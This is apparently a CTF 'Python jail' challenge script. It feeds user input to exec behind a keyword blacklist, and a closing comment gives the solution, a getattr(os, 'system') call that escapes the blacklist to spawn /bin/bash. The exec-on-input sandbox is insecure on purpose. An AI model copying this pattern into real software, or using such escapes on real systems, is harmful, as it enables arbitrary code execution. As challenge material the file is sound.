# -*-coding:utf-8-*-


#!/usr/bin/python3
import sys, cmd, os

del __builtins__.__dict__['__import__']
del __builtins__.__dict__['eval']

intro = """
Welcome to SCTF Python Interpreter
===================================================================================

 ____                 _           _        ____ _   _ ___ _____
|  _ \__      ___ __ | |__  _   _| |__    / ___| | | |_ _|_   _|
| |_) \ \ /\ / / '_ \| '_ \| | | | '_ \  | |   | | | || |  | |  
|  __/ \ V  V /| | | | | | | |_| | |_) | | |___| |_| || |  | |  
|_|     \_/\_/ |_| |_|_| |_|\__,_|_.__/   \____|\___/|___| |_|



 _ ____      ___ __     _____   _____ _ __ _   _| |_| |__ (_)_ __   __ _
| '_ \ \ /\ / / '_ \   / _ \ \ / / _ \ '__| | | | __| '_ \| | '_ \ / _` |
| |_) \ V  V /| | | | |  __/\ V /  __/ |  | |_| | |_| | | | | | | | (_| |
| .__/ \_/\_/ |_| |_|  \___| \_/ \___|_|   \__, |\__|_| |_|_|_| |_|\__, |
|_|                                        |___/                   |___/

===================================================================================
Rules:
    -No import
    -No ...
    -No flag

"""


def execute(command):
       exec(command, globals())

class Jail(cmd.Cmd):

    prompt     = '>>> '
    filtered    = '\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'.split('|')

    def do_EOF(self, line):
        sys.exit()

    def emptyline(self):
        return cmd.Cmd.emptyline(self)

    def default(self, line):
        sys.stdout.write('\x00')

    def postcmd(self, stop, line):
        if any(f in line for f in self.filtered):
            print("You are a big hacker !!!")
            print("Go away")
        else:
           try:
                execute(line)
           except NameError:
                print("NameError: name '%s' is not defined" % line)
           except Exception:
                print("Error: %s" % line)
        return cmd.Cmd.postcmd(self, stop, line)

if __name__ == "__main__":
    try:
        Jail().cmdloop(intro)
    except KeyboardInterrupt:
        print("\rSee you next time !")

'''
$python3 pwn50_jail.py

$ cat exp.md
print(getattr(os, "system")("/bin/bash"))
'''
